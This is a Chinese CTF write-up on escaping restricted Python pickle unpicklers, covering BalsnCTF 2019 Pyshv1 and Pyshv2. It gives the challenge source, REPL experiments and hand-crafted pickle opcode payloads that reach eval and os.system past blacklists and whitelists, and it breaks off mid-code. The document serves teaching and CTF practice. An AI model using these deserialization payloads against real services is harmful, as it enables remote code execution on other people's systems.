class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line">__all__ = (<span class="string">'PickleSerializer'</span>, )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    blacklist = &#123;<span class="string">'eval'</span>, <span class="string">'exec'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'open'</span>, <span class="string">'input'</span>, <span class="string">'__import__'</span>, <span class="string">'exit'</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">"builtins"</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> getattr(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">"global '%s.%s' is forbidden"</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleSerializer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> pickle.dumps(obj)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> isinstance(data, str):</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">"Can't load pickle from unicode string"</span>)</span><br><span class="line">            file = io.BytesIO(data)</span><br><span class="line">            <span class="keyword">return</span> RestrictedUnpickler(file,</span><br><span class="line">                              encoding=<span class="string">'ASCII'</span>, errors=<span class="string">'strict'</span>).load()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>这只是原题的一部分，重点关注下这个沙箱如何逃逸。先看个东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(globals()[<span class="string">'__builtins__'</span>], <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br><span class="line"></span><br><span class="line">&lt;=&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(dict.get(globals(), <span class="string">'__builtins__'</span>), <span class="string">'eval'</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p><code>getattr</code> 和 <code>globals</code> 并没有被禁，那就尝试写 pickle 吧。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cbuiltins</span><br><span class="line">getattr</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">dict</span><br><span class="line">S'get'</span><br><span class="line">tRp100</span><br><span class="line">(<span class="name">cbuiltins</span></span><br><span class="line">globals</span><br><span class="line">(<span class="name">tRS</span>'__builtins__'</span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>g100</span><br><span class="line">(<span class="name">g101</span></span><br><span class="line">S'eval'</span><br><span class="line">tR(<span class="name">S</span>'__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)'</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><p>PS：我的环境是 Python 3.7.4，反序列化时获取到的 <code>builtins</code> 是一个 <code>dict</code>，所以用了两次 <code>get</code>，视环境进行调整吧。这个 payload 在 Python 3.7.3 又跑不起来 ：）</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv1</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle, io</span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'sys'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure><p>限制了导入的模块只能是 <code>sys</code>，问题是这个模块也不安全呀 ：）</p><blockquote><p><code>sys.modules</code></p><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail.</p></blockquote><p>如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库是默认被加载进来的，例如 <code>os</code>，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。 </p><p>这里的 <code>find_class</code> 直接调的 pickle.py 中的方法，那就先看看它如何导入包的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pickle.Unpickler.find_class</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">    <span class="comment"># Subclasses may override this.</span></span><br><span class="line">    <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">        <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">            module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">        <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">            module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">    __import__(module, level=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> getattr(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>其中 <code>sys.modules</code> 为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    'sys': &lt; module 'sys'(built - in ) &gt; ,</span><br><span class="line">    'builtins': &lt; module 'builtins'(built - in ) &gt; ,</span><br><span class="line">    'os': &lt; module 'os'</span><br><span class="line">    from 'C:\\Users\\wywwzjj\\AppData\\Local\\Programs\\Python\\Python37\\lib\\os.py' &gt; ,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那我们的目标：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cos\nsystem  &lt;=&gt; getattr(sys.modules['os'], 'system')</span><br></pre></td></tr></table></figure><p>限制了 module 只能为 sys，那能否把 <code>sys.modules[&#39;sys&#39;]</code>替换为<code>sys.modules[&#39;os&#39;]</code>，从而引入危险模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line">modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> system</span><br></pre></td></tr></table></figure><p>本地实验一下，成功：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\wywwzjj&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">20</span>:<span class="number">34</span>:<span class="number">20</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from sys import modules</span><br><span class="line">&gt;&gt;&gt; modules[<span class="string">'sys'</span>] = modules[<span class="string">'os'</span>]</span><br><span class="line">&gt;&gt;&gt; from sys import system</span><br><span class="line">&gt;&gt;&gt; system(<span class="string">'dir'</span>)</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F497-F727</span><br><span class="line"></span><br><span class="line"> C:\Users\wywwzjj 的目录</span><br><span class="line"></span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          .</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>    &lt;DIR&gt;          ..</span><br><span class="line"><span class="number">2019</span>/<span class="number">08</span>/<span class="number">22</span>  <span class="number">21</span>:<span class="number">02</span>             <span class="number">2</span>,<span class="number">750</span> <span class="selector-class">.aggressor</span><span class="selector-class">.prop</span></span><br><span class="line"><span class="number">2019</span>/<span class="number">09</span>/<span class="number">16</span>  <span class="number">00</span>:<span class="number">09</span>    &lt;DIR&gt;          .anaconda</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">09</span>  <span class="number">13</span>:<span class="number">58</span>    &lt;DIR&gt;          .android</span><br><span class="line"><span class="number">2018</span>/<span class="number">12</span>/<span class="number">13</span>  <span class="number">14</span>:<span class="number">37</span>    &lt;DIR&gt;          .astropy</span><br><span class="line"><span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>  <span class="number">20</span>:<span class="number">36</span>            <span class="number">18</span>,<span class="number">465</span> .bash_history</span><br><span class="line"><span class="number">2019</span>/<span class="number">04</span>/<span class="number">07</span>  <span class="number">12</span>:<span class="number">03</span>    &lt;DIR&gt;          <span class="selector-class">.CLion2019</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>还有个小麻烦，<code>modules</code> 是个 <code>dict</code>，无法直接取值。继续利用 <code>getattr(sys.modules[module], name)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'sys'</span>] = sys.modules</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(sys)  <span class="comment"># 成功导入 dict 对象</span></span><br><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__getitem__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__le__'</span>, <span class="string">'__len__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__setitem__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'clear'</span>, <span class="string">'copy'</span>, <span class="string">'fromkeys'</span>, <span class="string">'get'</span>, <span class="string">'items'</span>, <span class="string">'keys'</span>, <span class="string">'pop'</span>, <span class="string">'popitem'</span>, <span class="string">'setdefault'</span>, <span class="string">'update'</span>, <span class="string">'values'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(sys, <span class="string">'get'</span>)  <span class="comment"># 结合 find_class 中的 getattr</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> method get of dict object at <span class="number">0x000002622D052688</span>&gt;</span><br></pre></td></tr></table></figure><p>改写成 pickle：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">'sys'</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line"><span class="built_in">get</span></span><br><span class="line">(S<span class="string">'os'</span></span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>S<span class="string">'sys'</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">'dir'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure><p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure><p>好了，问题又转变为如何获取键值，还是比较艰难。</p><p>查文档时又发现了一个东西，原来 <code>__import__</code> 可被覆盖。</p><blockquote><p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p><p>此函数会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义，但是 <strong>强烈</strong> 不建议这样做，因为使用导入钩子 (参见 <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> 而应该用 <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>。</p></blockquote><p>那该覆盖成什么函数呢？最好是 <code>__import__(module)</code> 后能返回字典的函数。</p><p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p><p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p><p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p><p>这个 <code>__getattribute__</code> 恰好能符合我们的要求，真棒。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure><p>再理下思路：（伪代码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = getattr(structs, <span 